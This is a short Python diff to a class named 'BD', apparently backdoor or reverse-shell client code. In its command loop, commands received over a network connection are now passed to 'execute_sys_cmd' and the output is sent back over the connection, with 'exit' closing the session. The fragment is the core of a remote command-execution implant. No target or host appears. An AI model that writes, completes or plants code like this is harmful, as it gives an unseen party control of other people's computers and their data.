@@ -55,8 +55,11 @@ class BD:
                 if cmd[0] == "exit":
                     self.connection.close()
                     sys.exit()
+                
+                else:
+                    cmd_result = self.execute_sys_cmd(cmd)
 
-
+                self.connect_send(cmd_result)
 
             except Exception as e:
                 try:
